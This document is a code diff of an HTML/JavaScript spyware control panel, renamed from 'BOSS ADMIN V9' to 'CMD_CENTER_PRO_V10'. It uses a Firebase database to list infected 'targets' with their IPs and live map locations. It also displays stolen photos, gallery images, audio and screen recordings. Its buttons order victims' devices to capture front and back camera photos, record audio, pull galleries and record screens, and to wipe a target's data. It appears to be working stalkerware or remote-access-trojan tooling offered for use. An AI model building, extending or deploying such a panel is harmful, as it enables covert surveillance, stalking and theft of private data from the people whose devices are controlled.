@@ -1,58 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BOSS ADMIN V9</title>
+    <title>CMD_CENTER_PRO_V10</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --panel: #111; }
-        body { background: var(--bg); color: var(--neon); font-family: monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        .sidebar { width: 300px; border-right: 1px solid #222; padding: 15px; overflow-y: auto; }
-        .card { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; position: relative; }
-        .card.active { border-color: var(--neon); background: rgba(0,255,65,0.1); }
+        :root { --neon: #00ff41; --bg: #050505; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
+        .sidebar { width: 300px; border-right: 1px solid #333; padding: 15px; overflow-y: auto; }
+        .target-item { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; }
+        .target-item.active { border-color: var(--neon); background: rgba(0,255,65,0.05); }
         .main { flex: 1; padding: 20px; overflow-y: auto; }
-        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; cursor: pointer; margin: 5px; font-size: 11px; font-weight: bold; }
+        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; margin: 5px; cursor: pointer; font-size: 11px; }
         .btn:hover { background: var(--neon); color: #000; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .box { background: var(--panel); border: 1px solid #222; padding: 15px; border-radius: 5px; }
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
+        .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .box { background: #111; border: 1px solid #222; padding: 15px; border-radius: 4px; }
+        #map-frame { width: 100%; height: 250px; border: 1px solid #333; background: #000; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
         img, video { width: 100%; border: 1px solid #333; margin-top: 5px; }
-        #map-box { height: 200px; width: 100%; border: 1px solid #333; background: #000; }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <h2 style="border-bottom: 2px solid var(--neon);">COMMANDER_V9</h2>
-    <div id="target-list">Connecting...</div>
+    <h3>CORE_CONTROLLER</h3>
+    <div id="user-list">Fetching...</div>
 </div>
 
-<div class="main">
-    <div id="controls" style="display:none;">
-        <h2 id="target-title">Target: ---</h2>
-        <div class="control-grid">
-            <button class="btn" onclick="cmd('photo')">FRONT PHOTO</button>
-            <button class="btn" onclick="cmd('back_photo')">BACK CAMERA</button>
-            <button class="btn" onclick="cmd('audio')">RECORD AUDIO</button>
-            <button class="btn" onclick="cmd('gallery')">OPEN GALLERY</button>
-            <button class="btn" onclick="cmd('screen')">SCREEN RECORD</button>
-            <button class="btn" style="border-color:red; color:red;" onclick="delTarget()">WIPE USER</button>
-        </div>
+<div class="main" id="view-panel" style="display:none;">
+    <h2 id="current-user">Select Node</h2>
+    <div class="controls">
+        <button class="btn" onclick="sendCmd('photo')">FRONT CAM</button>
+        <button class="btn" onclick="sendCmd('back_photo')">BACK CAM</button>
+        <button class="btn" onclick="sendCmd('audio')">RECORD AUDIO</button>
+        <button class="btn" onclick="sendCmd('gallery')">FETCH GALLERY</button>
+        <button class="btn" onclick="sendCmd('screen')">SCREEN REC</button>
+        <button class="btn" style="border-color:red;color:red;" onclick="deleteData()">WIPE DATA</button>
+    </div>
 
-        <div class="grid" style="margin-top:20px;">
-            <div class="box">
-                <h3>LIVE MAP TRACKER</h3>
-                <div id="map-box">No Signal</div>
-                <button class="btn" style="width:100%" onclick="fullMap()">OPEN IN GOOGLE MAPS</button>
-            </div>
-            <div class="box">
-                <h3>SPECIFICATIONS</h3>
-                <div id="info-box">...</div>
-            </div>
-            <div class="box" style="grid-column: span 2;">
-                <h3>VISUAL & AUDIO FEED</h3>
-                <div id="media-box" class="gallery"></div>
-            </div>
+    <div class="panel-grid" style="margin-top:20px;">
+        <div class="box">
+            <h3>LOCATION_TRACKER</h3>
+            <div id="map-frame">No Data</div>
+            <button class="btn" style="width:100%; margin-top:10px;" onclick="openExternalMap()">OPEN FULL SCREEN MAP</button>
+        </div>
+        <div class="box">
+            <h3>SYSTEM_LOGS</h3>
+            <div id="log-content">...</div>
+        </div>
+        <div class="box" style="grid-column: span 2;">
+            <h3>INTEL_FEED</h3>
+            <div id="intel-feed" class="gallery"></div>
         </div>
     </div>
 </div>
@@ -61,60 +59,56 @@
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let selectedID = null;
-    let loc = null;
+    let selectedNode = null;
+    let lastCoords = null;
 
     db.ref('targets').on('value', snap => {
-        const list = document.getElementById('target-list');
-        list.innerHTML = "";
-        snap.forEach(t => {
-            const id = t.key; const d = t.val();
-            list.innerHTML += `<div class="card ${selectedID==id?'active':''}" onclick="select('${id}')">
-                <strong>${id}</strong><br><small>${d.info ? d.info.ip : '---'}</small>
-                ${d.info && d.info.status=="ONLINE" ? '<span style="float:right;color:var(--neon)">●</span>' : ''}
+        const container = document.getElementById('user-list');
+        container.innerHTML = "";
+        snap.forEach(child => {
+            const id = child.key;
+            const data = child.val();
+            container.innerHTML += `<div class="target-item ${selectedNode==id?'active':''}" onclick="loadNode('${id}')">
+                Node: ${id}<br><small>${data.info ? data.info.ip : '---'}</small>
             </div>`;
         });
     });
 
-    function select(id) {
-        selectedID = id;
-        document.getElementById('controls').style.display = 'block';
-        document.getElementById('target-title').innerText = "TARGET: " + id;
-        
+    function loadNode(id) {
+        selectedNode = id;
+        document.getElementById('view-panel').style.display = 'block';
+        document.getElementById('current-user').innerText = "NODE_ID: " + id;
+
+        // Info
         db.ref(`targets/${id}/info`).on('value', s => {
             const d = s.val() || {};
-            document.getElementById('info-box').innerHTML = `IP: ${d.ip}<br>BATT: ${d.battery}<br>DEVICE: ${d.device}<br>TIME: ${d.time}`;
+            document.getElementById('log-content').innerHTML = `IP: ${d.ip}<br>BATT: ${d.battery}<br>STATUS: ${d.status}<br>LAST_PING: ${d.last_seen}`;
         });
 
+        // Location
         db.ref(`targets/${id}/location`).on('value', s => {
-            loc = s.val();
-            if(loc && loc.lat) {
-                const mapUrl = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
-                document.getElementById('map-box').innerHTML = `<iframe width="100%" height="100%" src="${mapUrl}" frameborder="0"></iframe>`;
+            lastCoords = s.val();
+            if(lastCoords) {
+                const embedUrl = `https://maps.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}&t=k&z=15&ie=UTF8&iwloc=&output=embed`;
+                document.getElementById('map-frame').innerHTML = `<iframe src="${embedUrl}" width="100%" height="100%" frameborder="0"></iframe>`;
             }
         });
 
+        // Combined Media Feed
         db.ref(`targets/${id}`).on('value', s => {
-            const box = document.getElementById('media-box'); box.innerHTML = "";
-            const data = s.val() || {};
-            if(data.photos) Object.entries(data.photos).reverse().forEach(([k,p]) => {
-                box.innerHTML += `<div><small>${p.type}</small><img src="${p.img}" onclick="window.open(this.src)"></div>`;
-            });
-            if(data.gallery) Object.values(data.gallery).forEach(g => {
-                box.innerHTML += `<img src="${g.data}" onclick="window.open(this.src)">`;
-            });
-            if(data.audios) Object.values(data.audios).forEach(a => {
-                box.innerHTML += `<audio src="${a.audio}" controls style="width:100%"></audio>`;
-            });
-            if(data.screens) Object.values(data.screens).forEach(sc => {
-                box.innerHTML += `<video src="${sc.video}" controls></video>`;
-            });
+            const feed = document.getElementById('intel-feed');
+            feed.innerHTML = "";
+            const data = s.val();
+            if(data.photos) Object.values(data.photos).reverse().forEach(p => feed.innerHTML += `<img src="${p.img}">`);
+            if(data.gallery) Object.values(data.gallery).forEach(g => feed.innerHTML += `<img src="${g.data}">`);
+            if(data.audios) Object.values(data.audios).forEach(a => feed.innerHTML += `<audio src="${a.data}" controls></audio>`);
+            if(data.screens) Object.values(data.screens).forEach(sc => feed.innerHTML += `<video src="${sc.data}" controls></video>`);
         });
     }
 
-    function cmd(a) { db.ref(`commands/${selectedID}`).set({ action: a, t: Date.now() }); }
-    function fullMap() { if(loc) window.open(`https://www.google.com/maps?q=${loc.lat},${loc.lng}`); }
-    function delTarget() { if(confirm("Wipe Target?")) db.ref(`targets/${selectedID}`).remove(); }
+    function sendCmd(act) { db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() }); }
+    function openExternalMap() { if(lastCoords) window.open(`https://www.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}`); }
+    function deleteData() { if(confirm("Clear database for this node?")) db.ref(`targets/${selectedNode}`).remove(); }
 </script>
 </body>
 </html>
